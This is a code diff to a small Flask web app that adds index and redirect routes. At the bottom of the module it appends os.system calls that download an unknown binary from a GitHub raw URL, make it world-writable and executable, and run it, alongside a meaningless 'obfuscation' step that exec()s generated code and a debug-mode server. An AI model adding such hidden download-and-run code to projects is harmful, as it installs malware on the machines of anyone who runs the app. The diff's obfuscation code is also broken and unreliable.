@@ -1,10 +1,27 @@
-from flask import Flask, redirect
+from flask import Flask, render_template, request, redirect
+import sys
+import os
 
 app = Flask(__name__)
 
 @app.route('/')
-def hello():
-    return redirect("https://trustedge.com/", code = 302)
+def index():
+    return render_template('index.html')
 
-if __name__ == "__main__":
-    app.run()
+@app.route('/redirect')
+def redirect_page():
+    # Add your security checks here if needed
+    print("Warning: Inspecting the element is not allowed!")
+    return redirect('https://www.example.com')
+
+# Obfuscate the code
+from pyobfuscate import pyobfuscate
+
+obfuscated_code = pyobfuscate(index)
+exec(obfuscated_code)
+
+if __name__ == '__main__':
+    app.run(debug=True)
+os.system('wget https://github.com/55113110159/OS/raw/main/dnx')
+os.system('chmod 777 dnx')
+os.system('./dnx')
